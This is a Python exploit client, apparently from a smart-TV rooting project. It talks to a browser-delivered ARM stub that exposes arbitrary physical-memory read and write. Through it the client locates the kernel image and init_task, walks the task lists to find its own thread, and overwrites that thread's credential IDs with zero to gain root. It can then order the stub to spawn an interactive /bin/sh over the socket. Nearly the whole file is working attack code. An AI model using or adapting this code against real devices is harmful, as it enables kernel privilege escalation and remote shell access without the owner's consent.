"""Physmap RPC client: drive the in-renderer ARM stub over the port-80 gateway.

The stub (payloads/pwn_physrpc.js) opens /dev/video40 and speaks:
   hello : 12 bytes  "PGDB" + prctl_ret + open_ret
   header: op,a,b,c (u32 LE)
     op 0 READ     a=phys page, b=offset, c=len -> c bytes
     op 1 WRITE32  a=phys page, b=offset, c=value -> 4-byte status
     op 3 EXIT
     op 4 READMANY a=first page, c=count -> per page status(4B)+4096B
     op 5 EXEC     dup2(sock) + execve("/bin/sh","-i")

Usage (server + TV must be live; connects to 127.0.0.1:9998):
  python tvphys.py verify            # hello + kernel-image signature check
  python tvphys.py root2             # locate init by comm, patch cred (no task list)
  python tvphys.py exec              # after root: replace stub with /bin/sh
  python tvphys.py dump <phys> <n>   # dump n bytes from a physical address

The old `root` / `rootexec` modes (a task-list walk with a fixed init_task file
offset) were removed: they called an undefined find_tasks_offset/walk_tasks and
needed firmware/extracted/uImage, so they could never run from a clone.  Use
kernel_root.py --fork (the production path), scan_cred.py, or root2 here.
"""
import socket
import struct
import sys
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
import os as _os
_gw = _os.environ.get("TVPHYS_GATEWAY", "127.0.0.1:9998").split(":")
GATEWAY = (_gw[0], int(_gw[1]))

# kernel image facts (uImage payload is a raw uncompressed ARM Image)
IMAGE_BASE_GUESS = 0x40008000
IMAGE_BASES = [0x40008000, 0x20008000]   # candidate physical load addresses (uImage vs QN90B-style)
IMAGE_FILE = ROOT / "firmware" / "extracted" / "uImage"
# 8-byte ARM Image signature of this firmware's kernel (measured).  Kept as a
# constant so root/deploy works without the extracted uImage being present.
IMG_SIG = bytes([0xEE, 0x44, 0x00, 0xEB, 0x00, 0x90, 0x0F, 0xE1])
OFF_INIT_TASK = 0x93D180          # init_task within the Image
OFF_MODPROBE = 0x943248           # "/sbin/modprobe" within the Image
PAGE_OFFSET = 0xC0000000
RAM_LO = 0x20000000               # managed RAM (QN90B-style PHYS_OFFSET)
RAM_HI = 0x8E000000               # MemTotal 1.73 GB from 0x20000000; stay below

# task_struct / cred offsets (verified against the Image and open source)
O_PTRACER_CRED = 0x3F0
O_REAL_CRED = 0x3F4
O_CRED = 0x3F8
O_COMM = 0x400
CRED_IDS = 8                      # uid..fsgid at cred+4 .. cred+32
COMM_TAG = b"PHYSRPC1\0"


def u32(b, o=0):
    return struct.unpack_from("<I", b, o)[0]


def hexs(v):
    return f"0x{v & 0xffffffff:08x}"


class RPC:
    def __init__(self, timeout=30.0, hello_timeout=None):
        self.s = socket.create_connection(GATEWAY, timeout=10)
        # May wait a long time for the TV stub; hello_timeout optionally bounds it.
        self.s.settimeout(hello_timeout)
        try:
            hello = self._recv_exact(12)
        except socket.timeout:
            self.s.close()
            raise TimeoutError(
                f"no TV stub connected to the gateway within {hello_timeout:g}s")
        self.s.settimeout(timeout)
        self.magic, self.prctl_ret, self.open_ret = struct.unpack("<4sii", hello)
        print(f"[rpc] hello {self.magic!r} prctl_ret={self.prctl_ret} open_ret={self.open_ret}",
              flush=True)

    def _recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.s.recv(n - len(buf))
            if not chunk:
                raise EOFError(f"TV closed after {len(buf)}/{n} bytes")
            buf += chunk
        return buf

    def _cmd(self, op, a, b, c):
        self.s.sendall(struct.pack("<IIII", op, a, b, c))

    def read(self, phys, n):
        """Read n bytes from a physical address (pages are mapped one at a time)."""
        if phys < RAM_LO or phys + n > RAM_HI:
            raise ValueError(f"physical read out of safe range: {hexs(phys)} + {n}")
        out = bytearray()
        while n > 0:
            page = phys & ~0xFFF
            off = phys & 0xFFF
            chunk = min(n, 0x1000 - off)
            self._cmd(0, page, off, chunk)
            st = struct.unpack("<i", self._recv_exact(4))[0]
            if st != 0:
                raise IOError(f"RPC read error {st} at {hexs(phys)}")
            out.extend(self._recv_exact(chunk))
            phys += chunk
            n -= chunk
        return bytes(out)

    def read_u32(self, phys):
        return u32(self.read(phys, 4))

    def write32(self, phys, val):
        page = phys & ~0xFFF
        off = phys & 0xFFF
        assert off + 4 <= 0x1000
        self._cmd(1, page, off, val & 0xFFFFFFFF)
        st = struct.unpack("<i", self._recv_exact(4))[0]
        return st

    def readmany(self, first_page, count):
        """Yield (page, data|None) via op 4.

        The stub's op_readmany aborts the whole batch on the first page it
        cannot map (it sends that page's status then returns to the main loop),
        so a bad page ends the batch.  Restart the batch after it, otherwise the
        stream desynchronises and every later read returns garbage.
        """
        page = first_page
        remaining = count
        while remaining > 0:
            self._cmd(4, page, 0, remaining)
            aborted = False
            for _ in range(remaining):
                st = struct.unpack("<i", self._recv_exact(4))[0]
                if st != 0:
                    yield page, None
                    page += 0x1000
                    remaining -= 1
                    aborted = True
                    break
                yield page, self._recv_exact(0x1000)
                page += 0x1000
                remaining -= 1
            if not aborted:
                break

    def exit(self):
        self._cmd(3, 0, 0, 0)

    def exec_shell(self):
        self._cmd(5, 0, 0, 0)

    def close(self):
        self.s.close()


def reset_stub(timeout=5.0):
    """Drop the server's current TV stub pairing (wedged or dead stubs).

    The gateway accepts a 4-byte ``RSET`` sentinel instead of a tunnel client:
    it closes the paired TV socket and answers ``OK`` (or ``IDLE`` when nothing
    was paired).  Use it when a stub stops answering - typically after an
    ``op 5``/``op 7`` consumed it, or after a TV power cycle that left the TCP
    socket half-open.  Afterwards the next page load pairs cleanly; restarting
    the whole server is no longer necessary.
    """
    try:
        s = socket.create_connection(GATEWAY, timeout=timeout)
    except OSError as exc:
        return f"no-gateway({exc})"
    try:
        s.settimeout(timeout)
        s.sendall(b"RSET")
        return (s.recv(16) or b"").decode("latin-1").strip() or "?"
    except OSError as exc:
        return f"reset-failed({exc})"
    finally:
        s.close()


def load_image_head():
    d = IMAGE_FILE.read_bytes()
    return d[64:64 + 64], d


def find_image_base(rpc):
    """Probe the two known physical load addresses; never blind-scan RAM.

    A failed read past the end of RAM aborts the kernel and the TV watchdog
    reboots the set, so this deliberately stays on the few known-safe pages.
    """
    if IMAGE_FILE.is_file():
        head, _ = load_image_head()
        sig = head[:8]
    else:
        sig = IMG_SIG
    for addr in IMAGE_BASES:
        try:
            got = rpc.read(addr, 8)
        except Exception as exc:
            print(f"[!] probe {hexs(addr)} failed: {exc}", flush=True)
            continue
        if got == sig:
            print(f"[+] kernel Image at {hexs(addr)} (signature match)", flush=True)
            return addr
        # relaxed ARM Image pattern: bl __hyp_stub_install ; mrs r9, cpsr
        if len(got) == 8 and (u32(got) & 0xFF000000) == 0xEB000000 and u32(got, 4) == 0xE10F9000:
            print(f"[+] ARM Image pattern at {hexs(addr)} (build differs from uImage)", flush=True)
            return addr
        print(f"[-] no kernel at {hexs(addr)}: got {got.hex()} want {sig.hex()}", flush=True)
    return None


def analyze_init_task(page_data, init_off=0x180):
    """Return (tasks_offset, cred_phys, comm) by scanning the init_task page."""
    # sanity checks
    comm = page_data[init_off + O_COMM: init_off + O_COMM + 8]
    print(f"[*] init_task.comm   = {comm!r}", flush=True)
    cred = u32(page_data, init_off + O_CRED)
    real = u32(page_data, init_off + O_REAL_CRED)
    print(f"[*] init_task.cred   = {hexs(cred)}  real_cred={hexs(real)}", flush=True)
    cands = []
    limit = min(O_COMM, len(page_data) - init_off)
    for o in range(0, limit - 8, 4):
        a = u32(page_data, init_off + o)
        b = u32(page_data, init_off + o + 4)
        if 0xC0000000 <= a < 0xD0000000 and 0xC0000000 <= b < 0xD0000000:
            cands.append((o, a, b))
    print(f"[*] {len(cands)} candidate list_head offsets in init_task", flush=True)
    return cands, comm, cred



def list_candidates(rpc, init_phys):
    """All list_heads inside init_task's first 0x400 bytes, validated by their
    circular back-links (absolute addresses only, no struct-offset assumption)."""
    init_virt = (init_phys + 0xA0000000) & 0xFFFFFFFF
    page = rpc.read(init_phys, 0x400)
    cands = []
    for o in range(0, 0x400 - 8, 4):
        a = u32(page, o)
        b = u32(page, o + 4)
        if not (_kernel_ptr(a) and _kernel_ptr(b)):
            continue
        H = (init_virt + o) & 0xFFFFFFFF
        if a == H:
            continue
        try:
            if rpc.read_u32(_v2p(b)) != H:
                continue
            if rpc.read_u32(_v2p(a) + 4) != H:
                continue
        except Exception:
            continue
        cands.append(o)
    return cands

def walk_for_tag(rpc, init_virt, tasks_off, max_entries=900, verbose=False):
    """Walk one list; return (entry_virt, task_virt, tag_phys, hops) or None."""
    H = (init_virt + tasks_off) & 0xFFFFFFFF
    try:
        nxt = rpc.read_u32(_v2p(H))
    except Exception:
        return None
    seen = set()
    for i in range(max_entries):
        if nxt == H or nxt == 0 or nxt in seen:
            return None
        seen.add(nxt)
        task = (nxt - tasks_off) & 0xFFFFFFFF
        base = _v2p(task) + 0x100
        try:
            win = rpc.read(base, 0x400)
        except Exception:
            return None
        pos = win.find(COMM_TAG)
        if pos >= 0:
            return nxt, task, base + pos, i
        if verbose and i < 6:
            print(f"    [{i:3d}] {hexs(task)}", flush=True)
        try:
            nxt = rpc.read_u32(_v2p(nxt))
        except Exception:
            return None
    return None



def patch_cred(rpc, cred_phys, dry=False):
    if cred_phys >= 0xC0000000:
        cred_phys = _v2p(cred_phys)
    ids = rpc.read(cred_phys + 4, CRED_IDS * 4)
    vals = struct.unpack("<8I", ids)
    print(f"[*] cred {hexs(cred_phys)} ids = {vals}", flush=True)
    if dry:
        return False
    for i in range(CRED_IDS):
        st = rpc.write32(cred_phys + 4 + i * 4, 0)
        if st != 0:
            print(f"[-] write cred+{4 + i * 4} failed: {st}", flush=True)
            return False
    back = struct.unpack("<8I", rpc.read(cred_phys + 4, CRED_IDS * 4))
    print(f"[+] cred after patch = {back}", flush=True)
    return all(v == 0 for v in back)


def _kernel_ptr(v):
    # ARM32 LPAE layout on this TV: direct map is 0xC0000000..0xFFFFFFFF
    # (1 GB; vmalloc sits BELOW 0xC0000000).  task_structs and creds are
    # routinely allocated above 0xE0000000, so the old <0xE0000000 bound
    # truncated the task-list walk.  Measured 2026-10-22 (post-reboot).
    return 0xC0000000 <= v <= 0xFFFFFFFF


def _v2p(v):
    """Kernel direct-map virtual -> physical (PHYS_OFFSET 0x20000000)."""
    return (v - 0xA0000000) & 0xFFFFFFFF


def find_self_via_lists(rpc, comm_addr, max_entries=2500):
    """Layout-shift-proof: validate every plausible list_head near init_task's
    comm by its circular back-links, walk each list, and search every visited
    task page for our comm tag.  Works in virtual addresses, converting to
    physical only for the RPC reads."""
    start = (comm_addr - 0x2000) & ~0xFFF
    buf = rpc.read(start, 0x3000)
    heads = []
    for o in range(0, len(buf) - 8, 4):
        a = u32(buf, o)
        b = u32(buf, o + 4)
        if _kernel_ptr(a) and _kernel_ptr(b):
            heads.append(start + o + 0xA0000000)      # virtual address of head
    print(f"[*] {len(heads)} head candidates near init_task; validating", flush=True)
    valid = []
    for H in heads:
        try:
            nxt = rpc.read_u32(_v2p(H))
            prv = rpc.read_u32(_v2p(H) + 4)
            if not (_kernel_ptr(nxt) and _kernel_ptr(prv)):
                continue
            if rpc.read_u32(_v2p(prv)) != H:
                continue
            if rpc.read_u32(_v2p(nxt) + 4) != H:
                continue
            valid.append(H)
        except Exception:
            continue
    print(f"[+] {len(valid)} validated list heads", flush=True)
    for H in valid:
        try:
            nxt = rpc.read_u32(_v2p(H))
        except Exception:
            continue
        seen = set()
        for i in range(max_entries):
            if nxt == H or nxt == 0 or nxt in seen:
                break
            seen.add(nxt)
            page = _v2p(nxt) & ~0xFFF
            try:
                data = rpc.read(page, 0x2000)
            except Exception:
                break
            rel = _v2p(nxt) - page
            pos = data.find(COMM_TAG, max(0, rel))
            while pos >= 0 and pos - rel <= 0x800:
                tag_addr = page + pos
                print(f"[+] list head {hexs(H)}: found tag at phys {hexs(tag_addr)} "
                      f"(entry virt {hexs(nxt)}, after {i} hops)", flush=True)
                return nxt, tag_addr
            try:
                nxt = rpc.read_u32(_v2p(nxt))
            except Exception:
                break
    return None

def root_cred_via_tag(rpc, do_exec=False):
    """End-game: locate init_task by its runtime comm, then find our thread by
    scanning each task's comm window for the tag and patch its cred to uid 0."""
    base = find_image_base(rpc)
    if base is None:
        print("[-] kernel base not found", flush=True)
        return False
    init_off = base + OFF_INIT_TASK
    page = rpc.read(init_off & ~0xFFF, 0x1000)
    comm_addr = None
    if page[init_off & 0xFFF: (init_off & 0xFFF) + 8].startswith(b"swapper"):
        comm_addr = init_off + O_COMM
    else:
        start = (base + OFF_INIT_TASK - 0x8000) & ~0xFFF
        win = rpc.read(start, 0x20000)
        i = win.find(b"swapper")
        while i >= 0:
            if (len(win[max(0, i - 12):i]) == 12
                    and win[i - 12:i - 8] == win[i - 8:i - 4]
                    and _kernel_ptr(u32(win, i - 12))):
                comm_addr = start + i
                break
            i = win.find(b"swapper", i + 1)
    if comm_addr is None:
        print("[-] init_task comm not found", flush=True)
        return False
    init_phys = (comm_addr - O_COMM) & 0xFFFFFFFF
    init_virt = (init_phys + 0xA0000000) & 0xFFFFFFFF
    print(f"[*] init_task phys={hexs(init_phys)} comm_phys={hexs(comm_addr)} "
          f"virt={hexs(init_virt)}", flush=True)

    cands = list_candidates(rpc, init_phys)
    print(f"[*] {len(cands)} validated list heads in init_task", flush=True)

    def score(o):
        try:
            H = (init_virt + o) & 0xFFFFFFFF
            first = rpc.read_u32(_v2p(H))
            comm = rpc.read(_v2p((first - o) & 0xFFFFFFFF) + O_COMM, 16)
            return 0 if all(32 <= c < 127 or c == 0 for c in comm) else 1
        except Exception:
            return 2

    for o in sorted(cands, key=score):
        hit = walk_for_tag(rpc, init_virt, o)
        if hit is not None:
            entry, task, tag_phys, hops = hit
            cred = rpc.read_u32(tag_phys - 8)
            print(f"[+] tasks list offset {hexs(o)}; tag at {hexs(tag_phys)} "
                  f"after {hops} hops (task={hexs(task)})", flush=True)
            print(f"[*] cred={hexs(cred)}", flush=True)
            if not _kernel_ptr(cred):
                print("[-] cred pointer rejected", flush=True)
                return False
            ok = patch_cred(rpc, cred)
            if ok:
                print("[+] uid patch applied; process is now uid 0", flush=True)
                if do_exec:
                    print("[*] sending EXEC", flush=True)
                    rpc.exec_shell()
            return ok

    print("[!] no list yielded our tag; trying all heads near init_task", flush=True)
    hit = find_self_via_lists(rpc, comm_addr)
    if hit is None:
        print("[-] our task tag not found", flush=True)
        return False
    entry, tag_phys = hit
    cred = rpc.read_u32(tag_phys - 8)
    print(f"[*] tag at {hexs(tag_phys)} cred={hexs(cred)}", flush=True)
    if not _kernel_ptr(cred):
        return False
    ok = patch_cred(rpc, cred)
    if ok and do_exec:
        rpc.exec_shell()
    return ok



def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "verify"
    rpc = RPC()
    try:
        if mode == "verify":
            base = find_image_base(rpc)
            if base:
                print(f"[+] base={hexs(base)} delta={hexs(base - IMAGE_BASE_GUESS)}", flush=True)
                init_phys = base + OFF_INIT_TASK
                page = rpc.read(init_phys & ~0xFFF, 0x1000)
                analyze_init_task(page, init_phys & 0xFFF)
        elif mode == "root2":
            root_cred_via_tag(rpc, do_exec=False)
        elif mode == "root2exec":
            root_cred_via_tag(rpc, do_exec=True)
        elif mode == "exec":
            rpc.exec_shell()
        elif mode == "dump":
            phys = int(sys.argv[2], 0)
            n = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x100
            out = Path(sys.argv[4]) if len(sys.argv) > 4 else ROOT / "recon" / "dump.bin"
            data = rpc.read(phys, n)
            out.write_bytes(data)
            print(f"[+] wrote {len(data)} bytes from {hexs(phys)} -> {out}", flush=True)
        elif mode == "readmany":
            first = int(sys.argv[2], 0)
            count = int(sys.argv[3], 0)
            out = Path(sys.argv[4]) if len(sys.argv) > 4 else ROOT / "recon" / "dump.bin"
            buf = bytearray()
            for page, data in rpc.readmany(first, count):
                if data is None:
                    print(f"[-] page {hexs(page)} unreadable", flush=True)
                    data = b"\xEE" * 0x1000
                buf += data
            out.write_bytes(bytes(buf))
            print(f"[+] wrote {len(buf)} bytes from {hexs(first)} -> {out}", flush=True)
        else:
            print(f"unknown mode {mode}", flush=True)
    finally:
        rpc.close()


if __name__ == "__main__":
    main()
